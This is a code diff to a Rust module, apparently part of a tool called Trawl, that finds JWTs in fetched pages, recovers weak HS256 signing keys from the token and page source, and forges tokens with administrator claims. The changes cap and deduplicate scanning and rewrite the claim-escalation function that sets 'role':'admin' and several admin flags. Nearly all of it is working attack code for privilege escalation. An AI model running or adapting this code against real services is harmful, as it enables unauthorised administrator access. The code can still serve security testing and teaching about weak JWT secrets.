@@ -17,6 +17,8 @@
 //! SHA-256 and HMAC are written out here, the same rule the rest of Trawl keeps:
 //! nothing borrowed.
 
+use std::collections::HashSet;
+
 const H0: [u32; 8] = [
     0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
 ];
@@ -215,23 +217,31 @@ fn is_token_char(byte: u8) -> bool {
     byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.')
 }
 
+/// The most JWTs one body is worth reading. A page that is nothing but `eyJ`
+/// runs is hostile, not a token store, and parsing each one is real work; past
+/// this many the rest are left unread.
+const MAX_TOKENS: usize = 256;
+
 /// Every JWT-shaped string in a run of bytes. A JWT is three base64url runs
 /// joined by dots, and an HS256 header base64url-encodes to something starting
 /// `eyJ`, so that prefix is where each search begins.
 pub fn find_tokens(text: &[u8]) -> Vec<String> {
     let mut out: Vec<String> = Vec::new();
+    let mut seen: HashSet<&[u8]> = HashSet::new();
     let mut i = 0;
-    while i + 3 <= text.len() {
+    while i + 3 <= text.len() && out.len() < MAX_TOKENS {
         if &text[i..i + 3] == b"eyJ" {
             let start = i;
             let mut end = i;
             while end < text.len() && is_token_char(text[end]) {
                 end += 1;
             }
-            if let Ok(candidate) = core::str::from_utf8(&text[start..end])
+            // Dedup on the raw bytes before the parse, so a page repeating one
+            // token a thousand times is verified once rather than every time.
+            if seen.insert(&text[start..end])
+                && let Ok(candidate) = core::str::from_utf8(&text[start..end])
                 && candidate.split('.').count() == 3
                 && parse(candidate).is_some()
-                && !out.contains(&candidate.to_string())
             {
                 out.push(candidate.to_string());
             }
@@ -281,7 +291,16 @@ pub fn candidate_keys(token: &Token, source: &[u8]) -> Vec<Vec<u8>> {
     }
 
     for haystack in [token.payload.as_slice(), source] {
-        for run in runs(haystack, |b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'-' | b'_' | b'='), 8) {
+        for run in runs(
+            haystack,
+            |b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'-' | b'_' | b'='),
+            8,
+        ) {
+            // Once the cap is reached there is no point decoding more runs, so
+            // the scan stops rather than walking the rest of a hostile source.
+            if keys.len() >= MAX_KEYS {
+                return keys;
+            }
             // The run itself, in case the secret is stored as plain text.
             push_key(&mut keys, run.to_vec());
             // And decoded, in case it was base64 of the real bytes.
@@ -331,17 +350,29 @@ pub fn recover_key(token: &Token, candidates: &[Vec<u8>]) -> Option<Vec<u8>> {
 /// with the recovered key and the token's own header, so it verifies exactly as
 /// the real one did.
 pub fn forge_admin(token: &Token, key: &[u8]) -> String {
-    let payload = String::from_utf8_lossy(&token.payload);
-    let base = payload.trim().trim_end_matches('}');
-    let separator = if base.trim_end().ends_with('{') { "" } else { "," };
-    let escalated = format!(
-        "{base}{separator}\"role\":\"admin\",\"admin\":true,\"is_admin\":true,\"isAdmin\":true}}"
-    );
-
-    let payload_b64 = b64url_encode(escalated.as_bytes());
+    let payload_b64 = b64url_encode(escalate_claims(&token.payload).as_bytes());
     let signing_input = format!("{}.{payload_b64}", token.header_b64);
     let signature = hmac_sha256(key, signing_input.as_bytes());
     format!("{signing_input}.{}", b64url_encode(&signature))
+}
+
+/// The token's own claims with the administrator ones set. Parsed and
+/// re-serialised rather than spliced, so a nested claim such as
+/// `{"user":{"id":1}}` survives instead of being cut off at its first closing
+/// brace. A payload that is not a JSON object starts from an empty one.
+fn escalate_claims(payload: &[u8]) -> String {
+    let mut value = serde_json::from_slice::<serde_json::Value>(payload)
+        .ok()
+        .filter(serde_json::Value::is_object)
+        .unwrap_or_else(|| serde_json::Value::Object(serde_json::Map::new()));
+
+    let claims = value.as_object_mut().expect("filtered to an object");
+    claims.insert("role".to_string(), serde_json::Value::from("admin"));
+    for flag in ["admin", "is_admin", "isAdmin"] {
+        claims.insert(flag.to_string(), serde_json::Value::from(true));
+    }
+
+    value.to_string()
 }
 
 #[cfg(test)]
